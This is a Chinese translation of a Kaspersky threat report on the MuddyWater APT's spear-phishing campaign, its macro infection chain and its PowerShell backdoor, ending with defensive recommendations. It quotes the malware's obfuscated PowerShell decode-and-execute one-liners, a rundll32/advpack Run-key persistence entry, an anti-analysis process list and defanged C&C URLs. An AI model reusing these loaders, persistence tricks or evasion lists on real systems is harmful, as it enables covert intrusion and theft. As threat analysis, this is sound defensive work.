# 持续升级：详细分析MuddyWater APT组织新型攻击技术

阅读量 **196887**

|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)

发布时间 : 2018-10-15 16:00:58

 **x**

##### 译文声明

本文是翻译文章，文章来源：securelist.com

原文地址：<https://securelist.com/muddywater/88059/>

译文仅供参考，具体内容表达以及含义原文为准。

![](https://p0.ssl.qhimg.com/t01217145e8ee30d0c7.jpg)

## 概述

MuddyWater是一个相对新型的APT，在2017年进入我们的视线。根据过去的持续监测，该APT起初主要针对于伊拉克和沙特阿拉伯的政府部门。然而，随着时间的推移，攻击者又将目标对准了中东、欧洲地区的一些国家和美国。我们在近期监测到大量的鱼叉式网络钓鱼邮件，主要针对约旦、土耳其、阿塞拜疆和巴基斯坦的政府、军队、电信公司和教育机构，此外针对伊拉克和沙特阿拉伯的攻击仍然在继续。另外，我们还在马里、奥地利、俄罗斯、伊朗和巴林发现了新型的共计文件。这些文件创建于2018年，并从5月开始不断升级。目前，该攻击过程仍在持续进行中。  
MuddyWater使用新型鱼叉式网络钓鱼文档，依靠社会工程学来诱导用户运行宏。攻击者使用一系列被控制的主机来发起攻击。在我们的深入研究中，发现了攻击者所掌握的一些其他文件和工具，此外还发现了攻击者出现的一些OPSEC失误。  
以前的相关研究，请参考：  
<https://sec0wn.blogspot.com/2018/05/clearing-muddywater-analysis-of-new.html?m=1>  
<https://reaqta.com/2017/11/muddywater-apt-targeting-middle-east/>  
<https://blog.malwarebytes.com/threat-analysis/2017/09/elaborate-scripting-fu-used-in-espionage-attack-against-saudi-arabia-government_entity/>  
<https://www.sekoia.fr/blog/falling-on-muddywater/>

## 针对不同国家的诱导文档

约旦：  
  
土耳其：  
  
  
沙特阿拉伯：  
  
  
阿塞拜疆：  
  
伊拉克：  
  
巴基斯坦：  
  
  
阿富汗：  

## 技术细节

我们针对恶意软件的提取和执行过程进行了分析，在感染初期，恶意软件通过宏的方式运行VBA代码，然后投放建立C&C通信的PowerShell代码，向C&C发送被感染用户系统信息，然后接收恶意软件支持的命令。

###  最初阶段感染

最初的感染开始于启用宏的Office 97-2003 Word文件，为了防止静态分析，该宏受密码保护。  
  
首次启用宏时，将会执行混淆后的恶意VBA代码。在某些情况下，当用户激活伪文本框时，也会执行恶意宏。

###  宏Payload分析：投放恶意文件、删除注册表项

经过Base64编码后的宏Payload，执行以下操作：  
1、将2-3个文件放入ProgramData文件夹。Payload会将文件放置到ProgramData文件夹的根目录或子目录中，这些文件的文件名根据恶意软件不同版本而变化。

    
    
    EventManager.dll
    EventManager.logs
    WindowsDefenderService.inil
    

2、在当前用户的RUN密钥（HKCU）中添加一个注册表项，以便在用户下次登录时能够运行。在某些情况下，宏会立即生成恶意Payload或恶意进程，而无需等待用户的下次登录。注册表项中的可执行文件名称会根据不同版本而变化。

    
    
    名称：WindowsDefenderUpdater
    类型：REG_EXPAND_SZ
    内容：c:windowssystem32rundll32.exe advpack.dll,LaunchINFSection C:ProgramDataEventManager.logs,Defender,1,
    

在用户下次登录时，投放的Payload将会运行。所选的可执行文件专门用于绕过白名单解决方案，因为这些文件全部来自Microsoft，很可能已经在白名单之中。这些文件的类型可能是INF、SCT和文本文件（3个文件的情况），也可能是VBS和文本文件（2个文件的情况）。

###  第一种情况：宏投放INF、SCT和文本文件

1、INF通过advpack.dll的LaunchINFSection函数启动；  
2、INF通过scrobj.dll（Microsoft Scriptlet库）注册SCT文件；  
3、借助WMI（winmgmt），SCT文件中的JavaScript或VBScript代码会生成只有一行的PowerShell程序，最终形成文本文件。  
只有一行的PowerShell代码如下：

    
    
    powershell.exe -exec Bypass -c $s=(get-content C:\ProgramData\WindowsDefenderService.ini);$d = @();$v = 0;$c = 0;while($c -ne $s.length){$v=($v*52)+([Int32][char]$s[$c]-40);if((($c+1)%3) -eq 0){while($v -ne 0){$vv=$v%256;if($vv -gt 0){$d+=[char][Int32]$vv}$v=[Int32]($v/256)}}$c+=1;};[array]::Reverse($d);iex([String]::Join(”,$d));
    

编码后的文本文件如下：  
  
执行流如下：  

###  第二种情况：宏投放VBS和文本文件

VBS文件首先将自身进行解码，随后调用mshta.exe，将只有一行的VBScript代码传递给它，之后生成一个PowerShell单行程序，最终形成文本文件（通常是经过Base64编码后的文本）。

    
    
    powershell.exe -w 1 -exec Bypass -nologo -noprofile -c iex([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String((get-content C:ProgramDataZIPSDKProjectConfManagerNT.ini))));
    

编码后的文本文件：  
  
执行流：  

## 恶意PowerShell代码分析

在其通过WMI、wscript.exe或mshta.exe调用PowerShell时，会执行只有一行的PowerShell代码（如上所述），该代码会读取在ProgramData中投放的（经过编码的）文本文件，然后对其进行解码，所生成的代码具有多层混淆。  
PowerShell代码首先禁用Office的“宏警告”和“保护视图”功能，以确保在之后的攻击中不再进行用户交互。它还允许宏代码访问内部VBA对象，以便在之后的攻击中能更加隐蔽地执行宏代码。  
  
接下来，它会根据硬编码的进程名称列表，检查系统正在运行的进程。如果找到，就会强制重启计算机。列表中的进程名称通常都与研究人员使用的各类工具相关。  
  
恶意软件禁用的进程名称：

    
    
    “win32_remote“,”win64_remote64“,”ollydbg“,”ProcessHacker“,”tcpview“,”autoruns“,”autorunsc“,”filemon“,”procmon“,”regmon“,”procexp“,”idaq“,”idaq64“,”ImmunityDebugger“,”Wireshark“,”dumpcap“,”HookExplorer“,”ImportREC“,”PETools“,”LordPE“,”dumpcap“,”SysInspector“,”proc_analyzer“,”sysAnalyzer“,”sniff_hit“,”windbg“,”joeboxcontrol“,”joeboxserver“
    

在某些情况下，它会计算每个正在运行进程名称的校验和（Checksum），如果该计算结果与任何硬编码的校验和匹配，就会通过ntdll.dll中NtRaiseHardError函数产生BSOD。

###  C&C通信

恶意软件会在$dragon_middle数组保存的一长串嵌入URL中随机选择一个URL，然后将该URL用于与C&C服务器的通信。如果无法将数据发送到所选择的C&C
URL，恶意软件会尝试从$middle_dragon中获取一个随机URL，休眠1-30秒后再次执行。  

###  对被感染系统进行侦查

恶意软件尝试通过 <https://api.ipify.org/> 网站来获取被感染用户的公网IP。  
然后，会将公网IP地址与操作系统版本、内网IP、主机名称、域名称、用户名称一起POST到之前选择的URL。这样一来，就允许攻击者根据被感染用户的IP、国家、地理位置、企业名称等信息，来筛选目标用户。根据攻击者C&C的响应，被感染系统将会获得一个名为$sysid的ID。在被感染系统每一次向C&C请求要执行的命令时，都会附带此ID。

###  支持的命令

恶意软件支持上传、屏幕截图、Excel、Outlook、执行新脚本、重启、关机、破坏这8条命令，这些命令会根据不同版本而发生变化。  
1、“screenshot”命令会在ProgramData中保存屏幕截图，文件名为a.PNG；  
2、“Excel”命令会接收PowerShell代码的另一个阶段，将其保存为c:programdataa.ps1，然后通过DDE，请求Excel执行新的PowerShell脚本；  
3、“Outlook命令”会接收PowerShell代码的另一个阶段，将其保存为c:programdataa.ps1，然后通过COM和MSHTA.exe，请求Outlook执行新的PowerShell脚本；  
4、“risk”命令会接收PowerShell代码的另一个阶段，将其保存为c:programdataa.ps1，然后通过COM交互请求Explorer.exe执行新脚本；  
5、“upload”命令会从C&C下载文件，并将它们保存到C:ProgramData中；  
6、“clean”命令会破坏被感染用户的C、D、E、F盘，然后重新启动计算机；  
7、“reboot”命令将重启计算机；  
8、“shutdown”命令将关闭计算机。  
在该恶意软件的一个版本中，这部分代码还会检查ProgramData文件夹中是否具有包含“Kasper”、“Panda”或“ESET”关键字的文件或文件夹。  

## 被感染用户

  
MuddyWater大多数被感染用户都位于约旦、土耳其、伊拉克、巴基斯坦、沙特阿拉伯、阿富汗和阿塞拜疆。另外，也有少数被感染用户位于俄罗斯、伊朗、巴林、奥地利和马里。在攻击中使用的诱饵恶意文件表明，这些攻击行为具有地缘政治方面的意图，主要针对敏感人员和敏感组织。

## 攻击者溯源

在对MuddyWater使用的PowerShell代码进行反混淆后，我们发现该代码类似于此前发现的恶意PowerShell脚本。攻击所使用的多个文档中，还带有嵌入的路径，其中包含作者的主机用户名称。这些路径在特定情况下会由Office嵌入到文档中，例如在将二进制对象（OLE控件，例如文本框或命令按钮）添加到Word文档中，就会附带其路径。这些路径具体如下：

    
    
    C:UsersleoAppDataLocalTempWord8.0MSForms.exd
    C:UserspoopakAppDataLocalTempWord8.0MSForms.exd
    C:UsersVendettaAppDataLocalTempWord8.0MSForms.exd
    C:UsersTurkAppDataLocalTempWord8.0MSForms.exd
    

其中，Leo、Poopak、Vendetta和Turk是创建文档或文档模板的用户名。Turk可能意指土耳其人。Poopak可能是一个波斯女生的名字，也可能暗示作者对“Pak”（巴基斯坦的缩写）不太友好。Leo可能是一个英语名字。当然，我们也无法保证上述猜测的真实性，攻击者也可能使用了随机的用户名来对研究人员造成迷惑。  
在多个实例中，我们还在样本中找到了中文文本，表明攻击者可能是对某些代码进行了重用：

    
    
    无法连接到网址，请等待龙…
    无法访问本地计算机寄存器
    任务计划程序访问被拒绝
    

这些文本的英文翻译如下：

    
    
    Unable to connect to the URL, please wait for the dragon…
    Unable to access local computer register
    Task Scheduler access denied
    

我们还注意到，在某些样本中（例如5a42a712e3b3cfa1db32d9e3d832f8f1），PowerShell代码只包含了3个C&C
URL。由此推测，在其他样本中找到的$dragon_middle中的C&C URL实际上可能是“噪音”，用于分散研究人员的注意力或者引起误报。  
3个C&C URL如下：

    
    
    http://www.cankayasrc[.]com/style/js/main.php
    http://ektamservis[.]com/includes/main.php
    http://gtme[.]ae/font-awesome/css/main.php
    

## 安全建议

针对这种特定目标的攻击，我们建议组织使用高级的监测、预防和分析解决方案，确保具有控制任何网络活动或用户系统上可疑文件的能力。  
要防止攻击者发现并利用安全漏洞，最好的办法是彻底消除漏洞，其中也包括由于系统不正确配置或使用受漏洞影响版本的应用程序所产生的漏洞。与此同时，还建议组织采取以下方法方案，以提高整体的防护能力：  
1、使用PoweShell约束语言模式（PowerShell Constrained Language Mode），该模式支持IEX、Add-Type和New-Object。  
2、锁定PowerShell执行策略，使用域的组策略（GPO）设置“AllSigned”（要求所有脚本和配置文件都必须由可信发布者签名）。  
3、使用白名单方案，防止某些子进程执行恶意代码。

## 总结

除了认真研究新型攻击方法和技术之外，MuddyWater的作者还在不断提升社会工程学的手段。攻击者正在不断改进他们的工具，以尽量降低被安全产品或安全服务检测的风险。Kaspersky
Lab预计，此后这种类型的攻击还将加剧。  
为了保护企业免受恶意软件的侵害，Kaspersky Lab研究人员建议采取以下措施：  
1、对员工进行安全教育，使其具备分辨网络钓鱼链接等恶意行为的能力。  
2、培养企业中安全人员配置检查、分析取证和网络监测的能力。  
3、使用可靠的企业级安全解决方案，以及能够通过分析网络异常来检测攻击的反特定目标解决方案。  
4、为企业中安全人员提供最新威胁情报的数据（例如IoC和Yara规则），这些数据将用于有针对性地预防和发现攻击。  
5、确保企业中补丁管理流程的及时性和有效性。

本文翻译自securelist.com
[原文链接](https://securelist.com/muddywater/88059/)。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **P!chu** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/161789](/post/id/161789)

安全客 - 有思想的安全新媒体

本文转载自: [securelist.com](https://securelist.com/muddywater/88059/)

如若转载,请注明出处： <https://securelist.com/muddywater/88059/>

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [MuddyWater](/tag/MuddyWater)

 **+1** __2赞

 __收藏

![](https://p3.ssl.qhimg.com/t01bd1dba67fe13cdc6.png) P!chu

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

